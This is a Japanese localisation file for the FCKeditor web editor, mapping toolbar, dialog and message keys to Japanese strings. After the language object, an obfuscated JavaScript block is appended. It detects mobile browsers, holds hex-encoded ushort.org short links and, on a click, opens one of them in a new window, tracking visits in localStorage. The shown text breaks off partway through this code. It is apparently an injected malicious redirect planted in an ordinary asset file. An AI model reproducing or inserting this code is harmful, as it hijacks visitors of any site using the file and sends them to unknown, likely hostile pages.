/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Japanese language file.
 */

var FCKLang =
{
// Language direction : "ltr" (left to right) or "rtl" (right to left).
Dir					: "ltr",

ToolbarCollapse		: "ツールバーを隠す",
ToolbarExpand		: "ツールバーを表示",

// Toolbar Items and Context Menu
Save				: "保存",
NewPage				: "新しいページ",
Preview				: "プレビュー",
Cut					: "切り取り",
Copy				: "コピー",
Paste				: "貼り付け",
PasteText			: "プレーンテキスト貼り付け",
PasteWord			: "ワード文章から貼り付け",
Print				: "印刷",
SelectAll			: "すべて選択",
RemoveFormat		: "フォーマット削除",
InsertLinkLbl		: "リンク",
InsertLink			: "リンク挿入/編集",
RemoveLink			: "リンク削除",
VisitLink			: "リンクを開く",
Anchor				: "アンカー挿入/編集",
AnchorDelete		: "アンカー削除",
InsertImageLbl		: "イメージ",
InsertImage			: "イメージ挿入/編集",
InsertFlashLbl		: "Flash",
InsertFlash			: "Flash挿入/編集",
InsertTableLbl		: "テーブル",
InsertTable			: "テーブル挿入/編集",
InsertLineLbl		: "ライン",
InsertLine			: "横罫線",
InsertSpecialCharLbl: "特殊文字",
InsertSpecialChar	: "特殊文字挿入",
InsertSmileyLbl		: "絵文字",
InsertSmiley		: "絵文字挿入",
About				: "FCKeditorヘルプ",
Bold				: "太字",
Italic				: "斜体",
Underline			: "下線",
StrikeThrough		: "打ち消し線",
Subscript			: "添え字",
Superscript			: "上付き文字",
LeftJustify			: "左揃え",
CenterJustify		: "中央揃え",
RightJustify		: "右揃え",
BlockJustify		: "両端揃え",
DecreaseIndent		: "インデント解除",
IncreaseIndent		: "インデント",
Blockquote			: "ブロック引用",
CreateDiv			: "Div 作成",
EditDiv				: "Div 編集",
DeleteDiv			: "Div 削除",
Undo				: "元に戻す",
Redo				: "やり直し",
NumberedListLbl		: "段落番号",
NumberedList		: "段落番号の追加/削除",
BulletedListLbl		: "箇条書き",
BulletedList		: "箇条書きの追加/削除",
ShowTableBorders	: "テーブルボーダー表示",
ShowDetails			: "詳細表示",
Style				: "スタイル",
FontFormat			: "フォーマット",
Font				: "フォント",
FontSize			: "サイズ",
TextColor			: "テキスト色",
BGColor				: "背景色",
Source				: "ソース",
Find				: "検索",
Replace				: "置き換え",
SpellCheck			: "スペルチェック",
UniversalKeyboard	: "ユニバーサル・キーボード",
PageBreakLbl		: "改ページ",
PageBreak			: "改ページ挿入",

Form			: "フォーム",
Checkbox		: "チェックボックス",
RadioButton		: "ラジオボタン",
TextField		: "１行テキスト",
Textarea		: "テキストエリア",
HiddenField		: "不可視フィールド",
Button			: "ボタン",
SelectionField	: "選択フィールド",
ImageButton		: "画像ボタン",

FitWindow		: "エディタサイズを最大にします",
ShowBlocks		: "ブロック表示",

// Context Menu
EditLink			: "リンク編集",
CellCM				: "セル",
RowCM				: "行",
ColumnCM			: "カラム",
InsertRowAfter		: "列の後に挿入",
InsertRowBefore		: "列の前に挿入",
DeleteRows			: "行削除",
InsertColumnAfter	: "カラムの後に挿入",
InsertColumnBefore	: "カラムの前に挿入",
DeleteColumns		: "列削除",
InsertCellAfter		: "セルの後に挿入",
InsertCellBefore	: "セルの前に挿入",
DeleteCells			: "セル削除",
MergeCells			: "セル結合",
MergeRight			: "右に結合",
MergeDown			: "下に結合",
HorizontalSplitCell	: "セルを水平方向分割",
VerticalSplitCell	: "セルを垂直方向に分割",
TableDelete			: "テーブル削除",
CellProperties		: "セル プロパティ",
TableProperties		: "テーブル プロパティ",
ImageProperties		: "イメージ プロパティ",
FlashProperties		: "Flash プロパティ",

AnchorProp			: "アンカー プロパティ",
ButtonProp			: "ボタン プロパティ",
CheckboxProp		: "チェックボックス プロパティ",
HiddenFieldProp		: "不可視フィールド プロパティ",
RadioButtonProp		: "ラジオボタン プロパティ",
ImageButtonProp		: "画像ボタン プロパティ",
TextFieldProp		: "１行テキスト プロパティ",
SelectionFieldProp	: "選択フィールド プロパティ",
TextareaProp		: "テキストエリア プロパティ",
FormProp			: "フォーム プロパティ",

FontFormats			: "標準;書式付き;アドレス;見出し 1;見出し 2;見出し 3;見出し 4;見出し 5;見出し 6;標準 (DIV)",

// Alerts and Messages
ProcessingXHTML		: "XHTML処理中. しばらくお待ちください...",
Done				: "完了",
PasteWordConfirm	: "貼り付けを行うテキストは、ワード文章からコピーされようとしています。貼り付ける前にクリーニングを行いますか？",
NotCompatiblePaste	: "このコマンドはインターネット・エクスプローラーバージョン5.5以上で利用可能です。クリーニングしないで貼り付けを行いますか？",
UnknownToolbarItem	: "未知のツールバー項目 \"%1\"",
UnknownCommand		: "未知のコマンド名 \"%1\"",
NotImplemented		: "コマンドはインプリメントされませんでした。",
UnknownToolbarSet	: "ツールバー設定 \"%1\" 存在しません。",
NoActiveX			: "エラー、警告メッセージなどが発生した場合、ブラウザーのセキュリティ設定によりエディタのいくつかの機能が制限されている可能性があります。セキュリティ設定のオプションで\"ActiveXコントロールとプラグインの実行\"を有効にするにしてください。",
BrowseServerBlocked : "サーバーブラウザーを開くことができませんでした。ポップアップ・ブロック機能が無効になっているか確認してください。",
DialogBlocked		: "ダイアログウィンドウを開くことができませんでした。ポップアップ・ブロック機能が無効になっているか確認してください。",
VisitLinkBlocked	: "新しいウィンドウを開くことができませんでした。ポップアップ・ブロック機能が無効になっているか確認してください。",

// Dialogs
DlgBtnOK			: "OK",
DlgBtnCancel		: "キャンセル",
DlgBtnClose			: "閉じる",
DlgBtnBrowseServer	: "サーバーブラウザー",
DlgAdvancedTag		: "高度な設定",
DlgOpOther			: "<その他>",
DlgInfoTab			: "情報",
DlgAlertUrl			: "URLを挿入してください",

// General Dialogs Labels
DlgGenNotSet		: "<なし>",
DlgGenId			: "Id",
DlgGenLangDir		: "文字表記の方向",
DlgGenLangDirLtr	: "左から右 (LTR)",
DlgGenLangDirRtl	: "右から左 (RTL)",
DlgGenLangCode		: "言語コード",
DlgGenAccessKey		: "アクセスキー",
DlgGenName			: "Name属性",
DlgGenTabIndex		: "タブインデックス",
DlgGenLongDescr		: "longdesc属性(長文説明)",
DlgGenClass			: "スタイルシートクラス",
DlgGenTitle			: "Title属性",
DlgGenContType		: "Content Type属性",
DlgGenLinkCharset	: "リンクcharset属性",
DlgGenStyle			: "スタイルシート",

// Image Dialog
DlgImgTitle			: "イメージ プロパティ",
DlgImgInfoTab		: "イメージ 情報",
DlgImgBtnUpload		: "サーバーに送信",
DlgImgURL			: "URL",
DlgImgUpload		: "アップロード",
DlgImgAlt			: "代替テキスト",
DlgImgWidth			: "幅",
DlgImgHeight		: "高さ",
DlgImgLockRatio		: "ロック比率",
DlgBtnResetSize		: "サイズリセット",
DlgImgBorder		: "ボーダー",
DlgImgHSpace		: "横間隔",
DlgImgVSpace		: "縦間隔",
DlgImgAlign			: "行揃え",
DlgImgAlignLeft		: "左",
DlgImgAlignAbsBottom: "下部(絶対的)",
DlgImgAlignAbsMiddle: "中央(絶対的)",
DlgImgAlignBaseline	: "ベースライン",
DlgImgAlignBottom	: "下",
DlgImgAlignMiddle	: "中央",
DlgImgAlignRight	: "右",
DlgImgAlignTextTop	: "テキスト上部",
DlgImgAlignTop		: "上",
DlgImgPreview		: "プレビュー",
DlgImgAlertUrl		: "イメージのURLを入力してください。",
DlgImgLinkTab		: "リンク",

// Flash Dialog
DlgFlashTitle		: "Flash プロパティ",
DlgFlashChkPlay		: "再生",
DlgFlashChkLoop		: "ループ再生",
DlgFlashChkMenu		: "Flashメニュー可能",
DlgFlashScale		: "拡大縮小設定",
DlgFlashScaleAll	: "すべて表示",
DlgFlashScaleNoBorder	: "外が見えない様に拡大",
DlgFlashScaleFit	: "上下左右にフィット",

// Link Dialog
DlgLnkWindowTitle	: "ハイパーリンク",
DlgLnkInfoTab		: "ハイパーリンク 情報",
DlgLnkTargetTab		: "ターゲット",

DlgLnkType			: "リンクタイプ",
DlgLnkTypeURL		: "URL",
DlgLnkTypeAnchor	: "このページのアンカー",
DlgLnkTypeEMail		: "E-Mail",
DlgLnkProto			: "プロトコル",
DlgLnkProtoOther	: "<その他>",
DlgLnkURL			: "URL",
DlgLnkAnchorSel		: "アンカーを選択",
DlgLnkAnchorByName	: "アンカー名",
DlgLnkAnchorById	: "エレメントID",
DlgLnkNoAnchors		: "(ドキュメントにおいて利用可能なアンカーはありません。)",
DlgLnkEMail			: "E-Mail アドレス",
DlgLnkEMailSubject	: "件名",
DlgLnkEMailBody		: "本文",
DlgLnkUpload		: "アップロード",
DlgLnkBtnUpload		: "サーバーに送信",

DlgLnkTarget		: "ターゲット",
DlgLnkTargetFrame	: "<フレーム>",
DlgLnkTargetPopup	: "<ポップアップウィンドウ>",
DlgLnkTargetBlank	: "新しいウィンドウ (_blank)",
DlgLnkTargetParent	: "親ウィンドウ (_parent)",
DlgLnkTargetSelf	: "同じウィンドウ (_self)",
DlgLnkTargetTop		: "最上位ウィンドウ (_top)",
DlgLnkTargetFrameName	: "目的のフレーム名",
DlgLnkPopWinName	: "ポップアップウィンドウ名",
DlgLnkPopWinFeat	: "ポップアップウィンドウ特徴",
DlgLnkPopResize		: "リサイズ可能",
DlgLnkPopLocation	: "ロケーションバー",
DlgLnkPopMenu		: "メニューバー",
DlgLnkPopScroll		: "スクロールバー",
DlgLnkPopStatus		: "ステータスバー",
DlgLnkPopToolbar	: "ツールバー",
DlgLnkPopFullScrn	: "全画面モード(IE)",
DlgLnkPopDependent	: "開いたウィンドウに連動して閉じる (Netscape)",
DlgLnkPopWidth		: "幅",
DlgLnkPopHeight		: "高さ",
DlgLnkPopLeft		: "左端からの座標で指定",
DlgLnkPopTop		: "上端からの座標で指定",

DlnLnkMsgNoUrl		: "リンクURLを入力してください。",
DlnLnkMsgNoEMail	: "メールアドレスを入力してください。",
DlnLnkMsgNoAnchor	: "アンカーを選択してください。",
DlnLnkMsgInvPopName	: "ポップ・アップ名は英字で始まる文字で指定してくだい。ポップ・アップ名にスペースは含めません",

// Color Dialog
DlgColorTitle		: "色選択",
DlgColorBtnClear	: "クリア",
DlgColorHighlight	: "ハイライト",
DlgColorSelected	: "選択色",

// Smiley Dialog
DlgSmileyTitle		: "顔文字挿入",

// Special Character Dialog
DlgSpecialCharTitle	: "特殊文字選択",

// Table Dialog
DlgTableTitle		: "テーブル プロパティ",
DlgTableRows		: "行",
DlgTableColumns		: "列",
DlgTableBorder		: "ボーダーサイズ",
DlgTableAlign		: "キャプションの整列",
DlgTableAlignNotSet	: "<なし>",
DlgTableAlignLeft	: "左",
DlgTableAlignCenter	: "中央",
DlgTableAlignRight	: "右",
DlgTableWidth		: "テーブル幅",
DlgTableWidthPx		: "ピクセル",
DlgTableWidthPc		: "パーセント",
DlgTableHeight		: "テーブル高さ",
DlgTableCellSpace	: "セル内余白",
DlgTableCellPad		: "セル内間隔",
DlgTableCaption		: "ｷｬﾌﾟｼｮﾝ",
DlgTableSummary		: "テーブル目的/構造",
DlgTableHeaders		: "Headers",	//MISSING
DlgTableHeadersNone		: "None",	//MISSING
DlgTableHeadersColumn	: "First column",	//MISSING
DlgTableHeadersRow		: "First Row",	//MISSING
DlgTableHeadersBoth		: "Both",	//MISSING

// Table Cell Dialog
DlgCellTitle		: "セル プロパティ",
DlgCellWidth		: "幅",
DlgCellWidthPx		: "ピクセル",
DlgCellWidthPc		: "パーセント",
DlgCellHeight		: "高さ",
DlgCellWordWrap		: "折り返し",
DlgCellWordWrapNotSet	: "<なし>",
DlgCellWordWrapYes	: "Yes",
DlgCellWordWrapNo	: "No",
DlgCellHorAlign		: "セル横の整列",
DlgCellHorAlignNotSet	: "<なし>",
DlgCellHorAlignLeft	: "左",
DlgCellHorAlignCenter	: "中央",
DlgCellHorAlignRight: "右",
DlgCellVerAlign		: "セル縦の整列",
DlgCellVerAlignNotSet	: "<なし>",
DlgCellVerAlignTop	: "上",
DlgCellVerAlignMiddle	: "中央",
DlgCellVerAlignBottom	: "下",
DlgCellVerAlignBaseline	: "ベースライン",
DlgCellType		: "Cell Type",	//MISSING
DlgCellTypeData		: "Data",	//MISSING
DlgCellTypeHeader	: "Header",	//MISSING
DlgCellRowSpan		: "縦幅(行数)",
DlgCellCollSpan		: "横幅(列数)",
DlgCellBackColor	: "背景色",
DlgCellBorderColor	: "ボーダーカラー",
DlgCellBtnSelect	: "選択...",

// Find and Replace Dialog
DlgFindAndReplaceTitle	: "検索して置換",

// Find Dialog
DlgFindTitle		: "検索",
DlgFindFindBtn		: "検索",
DlgFindNotFoundMsg	: "指定された文字列は見つかりませんでした。",

// Replace Dialog
DlgReplaceTitle			: "置き換え",
DlgReplaceFindLbl		: "検索する文字列:",
DlgReplaceReplaceLbl	: "置換えする文字列:",
DlgReplaceCaseChk		: "部分一致",
DlgReplaceReplaceBtn	: "置換え",
DlgReplaceReplAllBtn	: "すべて置換え",
DlgReplaceWordChk		: "単語単位で一致",

// Paste Operations / Dialog
PasteErrorCut	: "ブラウザーのセキュリティ設定によりエディタの切り取り操作が自動で実行することができません。実行するには手動でキーボードの(Ctrl+X)を使用してください。",
PasteErrorCopy	: "ブラウザーのセキュリティ設定によりエディタのコピー操作が自動で実行することができません。実行するには手動でキーボードの(Ctrl+C)を使用してください。",

PasteAsText		: "プレーンテキスト貼り付け",
PasteFromWord	: "ワード文章から貼り付け",

DlgPasteMsg2	: "キーボード(<STRONG>Ctrl+V</STRONG>)を使用して、次の入力エリア内で貼って、<STRONG>OK</STRONG>を押してください。",
DlgPasteSec		: "ブラウザのセキュリティ設定により、エディタはクリップボード・データに直接アクセスすることができません。このウィンドウは貼り付け操作を行う度に表示されます。",
DlgPasteIgnoreFont		: "FontタグのFace属性を無視します。",
DlgPasteRemoveStyles	: "スタイル定義を削除します。",

// Color Picker
ColorAutomatic	: "自動",
ColorMoreColors	: "その他の色...",

// Document Properties
DocProps		: "文書 プロパティ",

// Anchor Dialog
DlgAnchorTitle		: "アンカー プロパティ",
DlgAnchorName		: "アンカー名",
DlgAnchorErrorName	: "アンカー名を必ず入力してください。",

// Speller Pages Dialog
DlgSpellNotInDic		: "辞書にありません",
DlgSpellChangeTo		: "変更",
DlgSpellBtnIgnore		: "無視",
DlgSpellBtnIgnoreAll	: "すべて無視",
DlgSpellBtnReplace		: "置換",
DlgSpellBtnReplaceAll	: "すべて置換",
DlgSpellBtnUndo			: "やり直し",
DlgSpellNoSuggestions	: "- 該当なし -",
DlgSpellProgress		: "スペルチェック処理中...",
DlgSpellNoMispell		: "スペルチェック完了: スペルの誤りはありませんでした",
DlgSpellNoChanges		: "スペルチェック完了: 語句は変更されませんでした",
DlgSpellOneChange		: "スペルチェック完了: １語句変更されました",
DlgSpellManyChanges		: "スペルチェック完了: %1 語句変更されました",

IeSpellDownload			: "スペルチェッカーがインストールされていません。今すぐダウンロードしますか?",

// Button Dialog
DlgButtonText		: "テキスト (値)",
DlgButtonType		: "タイプ",
DlgButtonTypeBtn	: "ボタン",
DlgButtonTypeSbm	: "送信",
DlgButtonTypeRst	: "リセット",

// Checkbox and Radio Button Dialogs
DlgCheckboxName		: "名前",
DlgCheckboxValue	: "値",
DlgCheckboxSelected	: "選択済み",

// Form Dialog
DlgFormName		: "フォーム名",
DlgFormAction	: "アクション",
DlgFormMethod	: "メソッド",

// Select Field Dialog
DlgSelectName		: "名前",
DlgSelectValue		: "値",
DlgSelectSize		: "サイズ",
DlgSelectLines		: "行",
DlgSelectChkMulti	: "複数項目選択を許可",
DlgSelectOpAvail	: "利用可能なオプション",
DlgSelectOpText		: "選択項目名",
DlgSelectOpValue	: "選択項目値",
DlgSelectBtnAdd		: "追加",
DlgSelectBtnModify	: "編集",
DlgSelectBtnUp		: "上へ",
DlgSelectBtnDown	: "下へ",
DlgSelectBtnSetValue : "選択した値を設定",
DlgSelectBtnDelete	: "削除",

// Textarea Dialog
DlgTextareaName	: "名前",
DlgTextareaCols	: "列",
DlgTextareaRows	: "行",

// Text Field Dialog
DlgTextName			: "名前",
DlgTextValue		: "値",
DlgTextCharWidth	: "サイズ",
DlgTextMaxChars		: "最大長",
DlgTextType			: "タイプ",
DlgTextTypeText		: "テキスト",
DlgTextTypePass		: "パスワード入力",

// Hidden Field Dialog
DlgHiddenName	: "名前",
DlgHiddenValue	: "値",

// Bulleted List Dialog
BulletedListProp	: "箇条書き プロパティ",
NumberedListProp	: "段落番号 プロパティ",
DlgLstStart			: "開始文字",
DlgLstType			: "タイプ",
DlgLstTypeCircle	: "白丸",
DlgLstTypeDisc		: "黒丸",
DlgLstTypeSquare	: "四角",
DlgLstTypeNumbers	: "アラビア数字 (1, 2, 3)",
DlgLstTypeLCase		: "英字小文字 (a, b, c)",
DlgLstTypeUCase		: "英字大文字 (A, B, C)",
DlgLstTypeSRoman	: "ローマ数字小文字 (i, ii, iii)",
DlgLstTypeLRoman	: "ローマ数字大文字 (I, II, III)",

// Document Properties Dialog
DlgDocGeneralTab	: "全般",
DlgDocBackTab		: "背景",
DlgDocColorsTab		: "色とマージン",
DlgDocMetaTab		: "メタデータ",

DlgDocPageTitle		: "ページタイトル",
DlgDocLangDir		: "言語文字表記の方向",
DlgDocLangDirLTR	: "左から右に表記(LTR)",
DlgDocLangDirRTL	: "右から左に表記(RTL)",
DlgDocLangCode		: "言語コード",
DlgDocCharSet		: "文字セット符号化",
DlgDocCharSetCE		: "Central European",
DlgDocCharSetCT		: "Chinese Traditional (Big5)",
DlgDocCharSetCR		: "Cyrillic",
DlgDocCharSetGR		: "Greek",
DlgDocCharSetJP		: "Japanese",
DlgDocCharSetKR		: "Korean",
DlgDocCharSetTR		: "Turkish",
DlgDocCharSetUN		: "Unicode (UTF-8)",
DlgDocCharSetWE		: "Western European",
DlgDocCharSetOther	: "他の文字セット符号化",

DlgDocDocType		: "文書タイプヘッダー",
DlgDocDocTypeOther	: "その他文書タイプヘッダー",
DlgDocIncXHTML		: "XHTML宣言をインクルード",
DlgDocBgColor		: "背景色",
DlgDocBgImage		: "背景画像 URL",
DlgDocBgNoScroll	: "スクロールしない背景",
DlgDocCText			: "テキスト",
DlgDocCLink			: "リンク",
DlgDocCVisited		: "アクセス済みリンク",
DlgDocCActive		: "アクセス中リンク",
DlgDocMargins		: "ページ・マージン",
DlgDocMaTop			: "上部",
DlgDocMaLeft		: "左",
DlgDocMaRight		: "右",
DlgDocMaBottom		: "下部",
DlgDocMeIndex		: "文書のキーワード(カンマ区切り)",
DlgDocMeDescr		: "文書の概要",
DlgDocMeAuthor		: "文書の作者",
DlgDocMeCopy		: "文書の著作権",
DlgDocPreview		: "プレビュー",

// Templates Dialog
Templates			: "テンプレート(雛形)",
DlgTemplatesTitle	: "テンプレート内容",
DlgTemplatesSelMsg	: "エディターで使用するテンプレートを選択してください。<br>(現在のエディタの内容は失われます):",
DlgTemplatesLoading	: "テンプレート一覧読み込み中. しばらくお待ちください...",
DlgTemplatesNoTpl	: "(テンプレートが定義されていません)",
DlgTemplatesReplace	: "現在のエディタの内容と置換えをします",

// About Dialog
DlgAboutAboutTab	: "バージョン情報",
DlgAboutBrowserInfoTab	: "ブラウザ情報",
DlgAboutLicenseTab	: "ライセンス",
DlgAboutVersion		: "バージョン",
DlgAboutInfo		: "より詳しい情報はこちらで",

// Div Dialog
DlgDivGeneralTab	: "全般",
DlgDivAdvancedTab	: "高度な設定",
DlgDivStyle		: "スタイル",
DlgDivInlineStyle	: "インラインスタイル",

ScaytTitle			: "SCAYT",	//MISSING
ScaytTitleOptions	: "Options",	//MISSING
ScaytTitleLangs		: "Languages",	//MISSING
ScaytTitleAbout		: "About"	//MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const 